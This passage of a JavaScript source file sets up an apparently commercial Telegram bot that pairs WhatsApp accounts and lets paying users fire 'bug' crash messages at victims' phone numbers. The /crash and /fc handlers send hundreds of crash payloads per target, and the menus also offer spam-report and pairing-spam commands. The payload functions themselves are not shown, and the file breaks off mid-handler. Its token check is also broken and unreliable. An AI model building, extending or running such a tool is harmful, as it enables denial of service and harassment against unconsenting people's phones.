const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const fetch = require("node-fetch");
const cd = "./犬/cooldown.json";
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "./犬/group.json";

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

let premiumUsers = JSON.parse(fs.readFileSync('./犬/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./犬/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./犬/premium.json');
ensureFileExists('./犬/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./犬/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./犬/admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./犬/premium.json', (data) => (premiumUsers = data));
watchFile('./犬/admin.json', (data) => (adminUsers = data));

const developerId = "7429086469";
const chalk = require("chalk"); 
const config = require("./config.js"); 
const TelegramBot = require("node-telegram-bot-api"); const axios = require("axios"); 
const BOT_TOKEN = config.BOT_TOKEN; 
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const GITHUB_TOKEN_LIST_URL = 'https://raw.githubusercontent.com/ObyMoods/ObyDatabase/refs/heads/main/tokens.json';

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    if (response.data && Array.isArray(response.data.tokens)) {
      return response.data.tokens;
    } else {
      console.error(chalk.red("❌ Format data token dari GitHub tidak sesuai."));
      return [];
    }
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();

  // Pastikan validTokens adalah array sebelum pakai includes
  if (!Array.isArray(validTokens) || !validTokens.includes(GITHUB_TOKEN_LIST_URL)) {
    console.log(chalk.red("❌ WARNING! KAMU TERDETEKSI SEBAGAI PENYUSUP. MOHON HUBUNGI OWNER UNTUK MEMBELI AKSES."));
    process.exit(1);
  }

  console.log(chalk.green("(#) TOKEN TERVERIFIKASI⠀"));
  startBot();
}

function startBot() {
  console.clear();
  console.log(chalk.bold.green(`
  [BOT SUDAH AKTIF ✅]
  Selamat datang di sistem Bug!
  `));
  // Tambahkan logic bot Anda di sini...
}

validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,`\`\`\`
╔─═⊱ 「 📋 𝐋𝐎𝐀𝐃𝐈𝐍𝐆 」
│┏⊱ Number : ${botNumber}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

   if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(`\`\`\`
╔─═⊱ 「 📋 𝐑𝐄𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐀𝐆𝐀𝐈𝐍 」
│┏⊱ Number : ${botNumber}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(`\`\`\`
╔─═⊱ 「 📋 𝐆𝐀𝐆𝐀𝐋 𝐓𝐄𝐑𝐇𝐔𝐁𝐔𝐍𝐆  」
│┏⊱ Number : ${botNumber}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(`\`\`\`
╔─═⊱ 「 📋 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐓𝐄𝐑𝐇𝐔𝐁𝐔𝐍𝐆  」
│┏⊱ Number : ${botNumber}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
   } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "123CRAYX");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(`\`\`\`
╔─═⊱ 「 📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆  」
│┏⊱ Number : ${botNumber}
║┗⊱ Code : ${formattedCode}
┗━━━━━━━━━━━━━━━━━⬣
\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `𝗘𝗥𝗥𝗢𝗥\n𝗔𝗹𝗮𝘀𝗮𝗻 : ${error.message}`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });


  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

async function tiktokDl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      let data = [];
      function formatNumber(integer) {
        return Number(parseInt(integer)).toLocaleString().replace(/,/g, ".");
      }

      function formatDate(n, locale = "id-ID") {
        let d = new Date(n);
        return d.toLocaleDateString(locale, {
          weekday: "long",
          day: "numeric",
          month: "long",
          year: "numeric",
          hour: "numeric",
          minute: "numeric",
          second: "numeric",
        });
      }

      let domain = "https://www.tikwm.com/api/";
      let res = await (
        await axios.post(
          domain,
          {},
          {
            headers: {
              Accept: "application/json, text/javascript, */*; q=0.01",
              "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
              "Content-Type":
                "application/x-www-form-urlencoded; charset=UTF-8",
              Origin: "https://www.tikwm.com",
              Referer: "https://www.tikwm.com/",
              "User-Agent":
                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            },
            params: {
              url: url,
              count: 12,
              cursor: 0,
              web: 1,
              hd: 2,
            },
          }
        )
      ).data.data;

      if (!res) return reject("⚠️ *Gagal mengambil data!*");

      if (res.duration == 0) {
        res.images.forEach((v) => {
          data.push({ type: "photo", url: v });
        });
      } else {
        data.push(
          {
            type: "watermark",
            url: "https://www.tikwm.com" + res?.wmplay || "/undefined",
          },
          {
            type: "nowatermark",
            url: "https://www.tikwm.com" + res?.play || "/undefined",
          },
          {
            type: "nowatermark_hd",
            url: "https://www.tikwm.com" + res?.hdplay || "/undefined",
          }
        );
      }

      resolve({
        status: true,
        title: res.title,
        taken_at: formatDate(res.create_time).replace("1970", ""),
        region: res.region,
        id: res.id,
        duration: res.duration + " detik",
        cover: "https://www.tikwm.com" + res.cover,
        stats: {
          views: formatNumber(res.play_count),
          likes: formatNumber(res.digg_count),
          comment: formatNumber(res.comment_count),
          share: formatNumber(res.share_count),
          download: formatNumber(res.download_count),
        },
        author: {
          id: res.author.id,
          fullname: res.author.unique_id,
          nickname: res.author.nickname,
          avatar: "https://www.tikwm.com" + res.author.avatar,
        },
        video_links: data,
      });
    } catch (e) {
      reject("⚠️ *Terjadi kesalahan saat mengambil video!*");
    }
  });
}

function getRandomImage() {
  const images = [
    "https://files.catbox.moe/nscuvi.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}
// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /settimer 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `✅`;
  } else {
    return "❌";
  }
}
/////// BUG FUNCTION ///////


//=========== ASYNC FUNCTION SEND ==========\\
async function crayx1gb(target) {
for (let i = 0; i < 100; i++) {
await newDeleted(target);
await FcBetaOtax(target);
}
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  
  
  bot.sendPhoto(chatId, "https://files.catbox.moe/nscuvi.jpg", {  
    caption: `ᴋʟɪᴋ ᴄᴏᴍᴀɴᴅ xnexsus ᴅɪʙᴀᴘᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴜɴᴀᴋᴀɴ ʙᴏᴛ :
/xnexsus`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "👤 Owner", url: "https://t.me/Death_co"}],
      ]
    }
  });
});

// Handler untuk /start
bot.onText(/\/xnexsus/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const jidat = getCurrentDate();
  const bokepjepang = getBotRuntime();
  const randomImage = getRandomImage();
  const version = '9.9.9';
  const developer = 'Crayx';

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    const options = {
        caption: `Kamu bukan xnexsus verison ini hanya untuk xnexsus 
`,
        reply_markup: {
            inline_keyboard: [
                [{ text: "👤 𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Death_co" }, { text: "👁️ 𝘐𝘯𝘧𝘰", url: "https://t.me/Death_co" }],
                [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/Death_co" }]
            ]
        }
    };

           return bot.sendPhoto(chatId, randomImage, options);
}

  bot.sendPhoto(chatId, "https://files.catbox.moe/h4xbvv.jpg", {  
    caption: `\`\`\`
「 ( 王 ) > ( 🍃 ) 𝗢𝗹𝗮, 𝗯𝗲𝗺-𝘃𝗶𝗻𝗱𝗼, 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺─𝗖𝗿𝗮𝘀𝗵𝗲𝗿─𝗕𝘂𝗴─𝗕𝗼𝘁
私は非常に優秀な開発者によって開発されました。このボットをうまく活用しましょ 」
╭━───━⊱ ⊱⪩ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⪨⊰
┃❏ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : ${developer}
┃❏ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : ${version}
┃❏ 𝐔𝐬𝐞𝐫𝐧𝐚𝐧𝐞 : ${username}
┃❏ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${bokepjepang}
┃❏ 𝐃𝐚𝐭𝐞 : ${jidat}
╰━─────────────────━❏
\`\`\``,
       parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "「 👤 」𝐎͢𝐰͡𝐧͜𝐞͢𝐫⍣᳟𝐌͜𝐞͢𝐧͡𝐮༑⃟꙳", callback_data: "alyachan" }, { text: "「 🍁 」𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮͠༑⃟꙳", callback_data: "alyabug" }],
        [{ text: "「 🍀 」𝐓͢𝐨͡𝐨͜𝐥͢𝐬͡𝐌͠𝐞͢𝐧͡𝐮༑⃟꙳", callback_data: "alyatools" },  { text: "「 🌿 」𝐀͢𝐥͡𝐥͜𝐌͢𝐞͡𝐧͜𝐮༑⃟꙳", callback_data: "allmenualya" }],
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const bokepjepang = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const jidat = getCurrentDate();
    const randomImage = getRandomImage();
    const version = '1.0';
    const developer = 'Xnexsus Galaxy';

    let caption = "";
    let replyMarkup = {};

    if (query.data === "alyabug") {
      caption = `\`\`\`
╭━───━⊱ ⊱⪩ Xnexsus Galaxy 𝙸𝚂 𝙷𝙰𝚁𝙳 ⪨⊰
┃❏ /volx 62xxx
┃❏ /xbull 62xxx
┃❏ /xtra 62xxx
┃❏ /xdevil 62xxx
┃❏ /xsuper 62xxx
┃❏ /xval 62xxx
┃❏ /xcore 62xxx
╰━────────────────━❏
╭━───━⊱ ⊱⪩ Xnexsus 𝙰𝙽𝙳𝚁𝙾 ⪨⊰
┃❏ /fc 62xxx
┃❏ /crash 62xxx
╰━────────────────━❏
╭━───━⊱ ⊱⪩ Xnexsus 𝙸𝙾𝚂 ⪨⊰
┃❏ /xios 62xxx
╰━────────────────━❏
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Back To Menu", callback_data: "back" }]] };
    }

    if (query.data === "alyachan") {
      caption = `\`\`\`
╭━───━⊱ ⊱⪩ 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 ⪨⊰
┃❏ /addsender 62xxx
┃❏ /setjeda <ᴛɪᴍᴇ>
┃❏ /grouponly < ᴏɴ/ᴏғғ >
┃❏ /addowner <ɪᴅ>
┃❏ /delowner <ɪᴅ>
┃❏ /addprem <ɪᴅ>
┃❏ /delprem <ɪᴅ>
┃❏ /listprem <ᴄᴇᴋ>
╰━───────────────━❏
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Back To Menu", callback_data: "back" }]] };
    }
    
        if (query.data === "alyatools") {
      caption = `\`\`\`
╭━───━⊱ ⊱⪩ 𝚃𝙾𝙾𝙻𝚂 𝙼𝙴𝙽𝚄 ⪨⊰
┃❏ /spam_report <ʀᴇᴘᴏʀᴛ ᴡᴀ>
┃❏ /spam_pairing <ᴘᴀɪʀ ᴄᴏᴅᴇ>
╰━─────────────────━❏
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Back To Menu", callback_data: "back" }]] };
    }
    
    if (query.data === "allmenualya") {
      caption = `\`\`\`
╭━───━⊱ ⊱⪩ Xnexsus 𝙸𝚂 𝙷𝙰𝚁𝙳 ⪨⊰
┃❏ /volx 62xxx
┃❏ /xbull 62xxx
┃❏ /xtra 62xxx
┃❏ /xdevil 62xxx
┃❏ /xsuper 62xxx
┃❏ /xval 62xxx
┃❏ /xcore 62xxx
╰━────────────────━❏
╭━───━⊱ ⊱⪩ Xnexsus 𝙶𝙾𝙳 ⪨⊰
┃❏ /blank 62xxx
┃❏ /ui 62xxx
┃❏ /pay 62xxx
╰━────────────────━❏
╭━───━⊱ ⊱⪩ Xnexsus 𝙸𝙾𝚂 ⪨⊰
┃❏ /xios 62xxx
╰━────────────────━❏
╭━───━⊱ ⊱⪩ 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 ⪨⊰
┃❏ /addsender 62xxx
┃❏ /setjeda <ᴛɪᴍᴇ>
┃❏ /grouponly < ᴏɴ/ᴏғғ >
┃❏ /addowner <ɪᴅ>
┃❏ /delowner <ɪᴅ>
┃❏ /addprem <ɪᴅ>
┃❏ /delprem <ɪᴅ>
┃❏ /listprem <ᴄᴇᴋ>
╰━───────────────━❏      
╭━───━⊱ ⊱⪩ 𝚃𝙾𝙾𝙻𝚂 𝙼𝙴𝙽𝚄 ⪨⊰
┃❏ /spam_report <ʀᴇᴘᴏʀᴛ ᴡᴀ>
┃❏ /spam_pairing <ᴘᴀɪʀ ᴄᴏᴅᴇ>
╰━─────────────────━❏
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Back To Menu", callback_data: "back" }]] };
    }

    if (query.data === "back") {
      caption = `\`\`\`
「 ( 王 ) > ( 🍃 ) 𝗢𝗹𝗮, 𝗯𝗲𝗺-𝘃𝗶𝗻𝗱𝗼, 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺─𝗖𝗿𝗮𝘀𝗵𝗲𝗿─𝗕𝘂𝗴─𝗕𝗼𝘁
私は非常に優秀な開発者によって開発されました。このボットをうまく活用しましょ 」
╭━───━⊱ ⊱⪩ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⪨⊰
┃❏ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : ${developer}
┃❏ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : ${version}
┃❏ 𝐔𝐬𝐞𝐫𝐧𝐚𝐧𝐞 : ${username}
┃❏ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${bokepjepang}
┃❏ 𝐃𝐚𝐭𝐞 : ${jidat}
╰━─────────────────━❏
\`\`\``,
      replyMarkup = {
        inline_keyboard: [
        [{ text: "「 👤 」𝐎͢𝐰͡𝐧͜𝐞͢𝐫⍣᳟𝐌͜𝐞͢𝐧͡𝐮༑⃟꙳", callback_data: "alyachan" }, { text: "「 🍁 」𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮͠༑⃟꙳", callback_data: "alyabug" }],
        [{ text: "「 🍀 」𝐓͢𝐨͡𝐨͜𝐥͢𝐬͡𝐌͠𝐞͢𝐧͡𝐮༑⃟꙳", callback_data: "alyatools" },  { text: "「 🌿 」𝐀͢𝐥͡𝐥͜𝐌͢𝐞͡𝐧͜𝐮༑⃟꙳", callback_data: "allmenualya" }],
      ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media:  "https://files.catbox.moe/h4xbvv.jpg",
        
        caption: caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});  
//=======CASE BUG=========//
bot.onText(/\/crash (\d+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const targetNumber = match[1];
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const jid = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const jidat = getCurrentDate();
            const target = jid;

            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/Death_co" }]
      ]
    }
  });
}
           
            if (cooldown > 0) {
                   return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                   }

            try {     
            if (sessions.size === 0) {
            return bot.sendMessage(
            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
            );
            }
            const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/v6bq3x.jpg", {
            caption: `
\`\`\`
❏ Target :  ${formattedNumber}
❏ Status : Process...
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``, 
         parse_mode: "Markdown"
         });
         const progressStages = [
         { text: "[█░░░░░░░░░] 10%", delay: 200 },
         { text: "[███░░░░░░░] 30%", delay: 200 },
         { text: "[█████░░░░░] 50%", delay: 100 },
         { text: "[███████░░░] 70%", delay: 100 },
         { text: "[█████████░] 90%", delay: 100 },
         { text: "[██████████] 100%", delay: 200 }
         ];
         for (const stage of progressStages) {
         await new Promise(resolve => setTimeout(resolve, stage.delay));
         await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status : Sending....
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${stage.text}
❏ Date : ${jidat}
\`\`\``,    { 
         chat_id: chatId, 
         message_id: sentMessage.message_id, 
         parse_mode: "Markdown" });
         }
    
        console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        for (let i = 0; i < 100; i++) {
        await newDeleted(target);
        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
}
        await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status: Succes
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
❏ Date : ${jidat}
\`\`\``, 
   
        {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙱𝚄𝙶 ‼️", url: `https://wa.me/${formattedNumber}` }]]
        }
        });

        } catch (error) {
       bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
        }    
        });                                                                                  
bot.onText(/\/fc (\d+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const targetNumber = match[1];
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const jid = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const jidat = getCurrentDate();
            const target = jid;

            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/Death_co" }]
      ]
    }
  });
}
           
            if (cooldown > 0) {
                   return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                   }

            try {     
            if (sessions.size === 0) {
            return bot.sendMessage(
            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
            );
            }
            const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/v6bq3x.jpg", {
            caption: `
\`\`\`
❏ Target :  ${formattedNumber}
❏ Status : Process...
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``, 
         parse_mode: "Markdown"
         });
         const progressStages = [
         { text: "[█░░░░░░░░░] 10%", delay: 200 },
         { text: "[███░░░░░░░] 30%", delay: 200 },
         { text: "[█████░░░░░] 50%", delay: 100 },
         { text: "[███████░░░] 70%", delay: 100 },
         { text: "[█████████░] 90%", delay: 100 },
         { text: "[██████████] 100%", delay: 200 }
         ];
         for (const stage of progressStages) {
         await new Promise(resolve => setTimeout(resolve, stage.delay));
         await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status : Sending....
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${stage.text}
❏ Date : ${jidat}
\`\`\``,    { 
         chat_id: chatId, 
         message_id: sentMessage.message_id, 
         parse_mode: "Markdown" });
         }
    
        console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        for (let i = 0; i < 300; i++) {
        await FcBetaOtax(target);
        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
}
        await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status: Succes
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
❏ Date : ${jidat}
